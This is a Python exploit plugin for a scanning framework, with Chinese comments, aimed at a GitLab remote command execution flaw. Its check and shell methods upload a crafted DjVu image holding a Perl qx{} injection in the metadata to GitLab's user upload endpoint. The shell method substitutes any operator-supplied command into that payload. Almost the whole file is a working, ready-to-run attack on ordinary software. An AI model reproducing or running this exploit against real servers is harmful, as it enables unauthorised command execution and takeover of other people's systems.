# -*-* coding:UTF-8
from bs4 import BeautifulSoup


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "desc": "Gitlab 远程命令执行漏洞",
        "datetime": "2021-12-27"
    }

    def url(self) -> dict:
        """ 验证方法 """
        r = self.request(method='get', url='./users/sign_in')
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            r1 = self.post_method(
                {
                    "url": "./uploads/user",
                    "timeout": "15",
                    "data": "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; "
                            "name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: "
                            "image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F"
                            "\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,"
                            "q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08"
                            "\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01"
                            "\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9f"
                            "BG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t"
                            "(Copyright \"\\\n\" . qx{whoami} . \\\n\" b \") )"
                            "\n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n",
                    "headers": {
                        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                        "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"
                    }
                }
            )
            if 'Failed to process image' in r1.text:
                return {
                    'LoopholeInfo': {'app': "Gitlab"}
                }

    def attack(self):
        """ 利用方法 """
        ...

    @cli.options('cmd', desc="执行命令", default="whoami")
    def shell(self, cmd):
        r = self.request(method='get', url='./users/sign_in')
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            r1 = self.post_method(
                {
                    "url": "./uploads/user",
                    "timeout": "15",
                    "data": "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; "
                            "name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: "
                            "image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F"
                            "\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,"
                            "q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08"
                            "\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01"
                            "\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9f"
                            "BG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t"
                            "(Copyright \"\\\n\" . qx{%s} . \\\n\" b \") )"
                            "\n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n" % cmd,
                    "headers": {
                        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                        "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"
                    }
                }
            )
            if 'Failed to process image' in r1.text:
                return "success"
            else:
                return "failure"
